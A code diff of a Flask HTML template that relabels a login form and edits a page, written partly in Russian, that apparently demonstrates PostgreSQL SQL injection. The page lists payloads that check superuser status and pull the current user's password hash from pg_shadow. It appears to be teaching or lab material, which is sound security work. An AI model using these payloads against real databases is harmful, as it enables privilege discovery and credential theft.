@@ -5,7 +5,7 @@
 <div class="container justify-content-center mt-5 card card-body">
 <form method='post' action="{{ url_for('auth') }}">
   <div class="mb-3">
-    <label for="exampleInputEmail1" class="form-label">Email address</label>
+    <label for="exampleInputEmail1" class="form-label">Email</label>
     <input class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" name="email">
     <div id="emailHelp" class="form-text">
         {% with messages = get_flashed_messages() %}
@@ -18,7 +18,7 @@
     </div>
   </div>
   <div class="mb-3">
-    <label for="exampleInputPassword1" class="form-label">Password</label>
+    <label for="exampleInputPassword1" class="form-label">Пароль</label>
     <input type="password" class="form-control" id="exampleInputPassword1" name="password">
   </div>
   <div class="mb-3 form-check">
@@ -53,11 +53,11 @@
         </div>
         <div>
             <h3>3. Является ли текущий пользователь суперпользователем</h3>
-            <p class='review'>123')||(SHOW is_superuser);--</p>
+            <p class='review'>123')||(SELECT current_setting('is_superuser'));--</p>
         </div>
         <div>
             <h3>4. Получить логин и хэш пароля</h3>
-            <p class='review'>123')||(SELECT usename, passwd FROM pg_shadow WHERE usename = current_user);--</p>
+            <p class='review'>123')||(SELECT passwd FROM pg_shadow WHERE usename = current_user);--</p>
             <i><p>Системная таблица pg_shadow хранит логины и хэши паролей</p></i>
         </div>
   </div>
